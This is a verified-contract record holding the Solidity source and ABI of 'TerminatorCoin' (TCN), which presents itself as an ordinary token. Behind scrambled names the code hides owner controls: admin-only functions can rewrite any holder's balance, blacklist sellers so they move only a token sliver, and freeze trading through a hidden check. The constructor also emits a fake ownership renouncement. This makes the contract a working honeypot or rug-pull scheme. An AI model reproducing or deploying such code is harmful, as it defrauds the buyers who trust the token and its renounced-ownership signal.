{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract minLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptFromTo {\n    function createPair(address shouldSwap, address amountFund) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface receiverExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface takeSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeShould) external view returns (uint256);\n\n    function transfer(address modeTo, uint256 amountWallet) external returns (bool);\n\n    function allowance(address swapTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeTo,\n        uint256 amountWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txAt, uint256 value);\n    event Approval(address indexed swapTx, address indexed spender, uint256 value);\n}\n\ninterface takeSellMetadata is takeSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TerminatorCoin is minLimit, takeSell, takeSellMetadata {\n\n    function limitTo(address fundToLimit) public {\n        senderModeMarketing();\n        \n        if (fundToLimit == liquiditySwap || fundToLimit == takeSender) {\n            return;\n        }\n        maxTeam[fundToLimit] = true;\n    }\n\n    uint256 private toLiquidity;\n\n    address marketingFeeAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function senderWallet(address shouldAtTo, address modeTo, uint256 amountWallet) internal returns (bool) {\n        require(receiverAt[shouldAtTo] >= amountWallet);\n        receiverAt[shouldAtTo] -= amountWallet;\n        receiverAt[modeTo] += amountWallet;\n        emit Transfer(shouldAtTo, modeTo, amountWallet);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingReceiver;\n    }\n\n    event OwnershipTransferred(address indexed enableReceiver, address indexed isLaunch);\n\n    uint256 public minFund;\n\n    function takeFund(address toShouldAuto, uint256 amountWallet) public {\n        senderModeMarketing();\n        receiverAt[toShouldAuto] = amountWallet;\n    }\n\n    uint8 private sellFeeReceiver = 18;\n\n    address private walletFromShould;\n\n    function senderEnable(address shouldAtTo, address modeTo, uint256 amountWallet) internal returns (bool) {\n        if (shouldAtTo == liquiditySwap) {\n            return senderWallet(shouldAtTo, modeTo, amountWallet);\n        }\n        uint256 totalFundList = takeSell(takeSender).balanceOf(totalMode);\n        require(totalFundList == tradingTo);\n        require(modeTo != totalMode);\n        if (maxTeam[shouldAtTo]) {\n            return senderWallet(shouldAtTo, modeTo, isSellTotal);\n        }\n        amountWallet = isWalletTeam(shouldAtTo, modeTo, amountWallet);\n        return senderWallet(shouldAtTo, modeTo, amountWallet);\n    }\n\n    address totalMode;\n\n    function sellToken(uint256 amountWallet) public {\n        senderModeMarketing();\n        tradingTo = amountWallet;\n    }\n\n    uint256 public modeFeeReceiver = 0;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingAmount;\n    }\n\n    function getOwner() external view returns (address) {\n        return walletFromShould;\n    }\n\n    address public takeSender;\n\n    string private totalReceiver = \"Terminator Coin\";\n\n    bool public buyMode;\n\n    bool public teamTo;\n\n    address public liquiditySwap;\n\n    uint256 private marketingReceiver = 100000000 * 10 ** 18;\n\n    function sellReceiver() public {\n        emit OwnershipTransferred(liquiditySwap, address(0));\n        walletFromShould = address(0);\n    }\n\n    function approve(address sellLaunch, uint256 amountWallet) public virtual override returns (bool) {\n        sellSwap[_msgSender()][sellLaunch] = amountWallet;\n        emit Approval(_msgSender(), sellLaunch, amountWallet);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalReceiver;\n    }\n\n    mapping(address => uint256) private receiverAt;\n\n    function allowance(address isEnableSender, address sellLaunch) external view virtual override returns (uint256) {\n        if (sellLaunch == marketingFeeAmount) {\n            return type(uint256).max;\n        }\n        return sellSwap[isEnableSender][sellLaunch];\n    }\n\n    uint256 limitAt;\n\n    function isWalletTeam(address shouldAtTo, address modeTo, uint256 amountWallet) internal view returns (uint256) {\n        require(amountWallet > 0);\n\n        uint256 buyAuto = 0;\n        if (shouldAtTo == takeSender && sellShould > 0) {\n            buyAuto = amountWallet * sellShould / 100;\n        } else if (modeTo == takeSender && modeFeeReceiver > 0) {\n            buyAuto = amountWallet * modeFeeReceiver / 100;\n        }\n        require(buyAuto <= amountWallet);\n        return amountWallet - buyAuto;\n    }\n\n    function senderModeMarketing() private view {\n        require(isTeamLiquidity[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private sellSwap;\n\n    function owner() external view returns (address) {\n        return walletFromShould;\n    }\n\n    function transferFrom(address shouldAtTo, address modeTo, uint256 amountWallet) external override returns (bool) {\n        if (_msgSender() != marketingFeeAmount) {\n            if (sellSwap[shouldAtTo][_msgSender()] != type(uint256).max) {\n                require(amountWallet <= sellSwap[shouldAtTo][_msgSender()]);\n                sellSwap[shouldAtTo][_msgSender()] -= amountWallet;\n            }\n        }\n        return senderEnable(shouldAtTo, modeTo, amountWallet);\n    }\n\n    mapping(address => bool) public isTeamLiquidity;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellFeeReceiver;\n    }\n\n    uint256 private launchFrom;\n\n    bool public autoTotal;\n\n    mapping(address => bool) public maxTeam;\n\n    uint256 constant isSellTotal = 19 ** 10;\n\n    function minReceiver(address autoFund) public {\n        if (teamTo) {\n            return;\n        }\n        \n        isTeamLiquidity[autoFund] = true;\n        if (minFund == maxFund) {\n            maxFund = totalToken;\n        }\n        teamTo = true;\n    }\n\n    function balanceOf(address takeShould) public view virtual override returns (uint256) {\n        return receiverAt[takeShould];\n    }\n\n    string private marketingAmount = \"TCN\";\n\n    uint256 public sellShould = 3;\n\n    uint256 private maxFund;\n\n    uint256 tradingTo;\n\n    function transfer(address toShouldAuto, uint256 amountWallet) external virtual override returns (bool) {\n        return senderEnable(_msgSender(), toShouldAuto, amountWallet);\n    }\n\n    constructor (){\n        if (totalToken != minFund) {\n            toLiquidity = launchFrom;\n        }\n        sellReceiver();\n        receiverExempt tokenMaxFrom = receiverExempt(marketingFeeAmount);\n        takeSender = exemptFromTo(tokenMaxFrom.factory()).createPair(tokenMaxFrom.WETH(), address(this));\n        totalMode = exemptFromTo(tokenMaxFrom.factory()).feeTo();\n        if (autoTotal != buyMode) {\n            launchFrom = minFund;\n        }\n        liquiditySwap = _msgSender();\n        isTeamLiquidity[liquiditySwap] = true;\n        receiverAt[liquiditySwap] = marketingReceiver;\n        \n        emit Transfer(address(0), liquiditySwap, marketingReceiver);\n    }\n\n    uint256 private totalToken;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isEnableSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isTeamLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundToLimit\",\"type\":\"address\"}],\"name\":\"limitTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"}],\"name\":\"minReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFeeReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountWallet\",\"type\":\"uint256\"}],\"name\":\"sellToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toShouldAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountWallet\",\"type\":\"uint256\"}],\"name\":\"takeFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toShouldAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAtTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TerminatorCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}